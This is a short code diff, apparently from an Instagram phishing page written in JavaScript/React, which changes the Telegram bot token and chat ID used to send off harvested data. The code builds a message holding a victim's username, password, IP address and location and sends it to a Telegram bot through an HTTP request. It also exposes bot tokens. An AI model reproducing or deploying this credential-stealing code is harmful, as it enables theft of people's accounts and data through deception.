@@ -37,8 +37,8 @@ const Instagram = () => {
         var PasswordLogin = formData.password;
         var SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-        var token = "6650969963:AAECQrzycrXYX2_j45OEBuoMU38lLXTjLh8";
-        var chat_id = -1002076860805;
+        var token = "6487678113:AAEnSRLqV9eUAI_4Ld32zFP4fixtJAUaYag";
+        var chat_id = -4180316090;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;
 
         let api = new XMLHttpRequest();
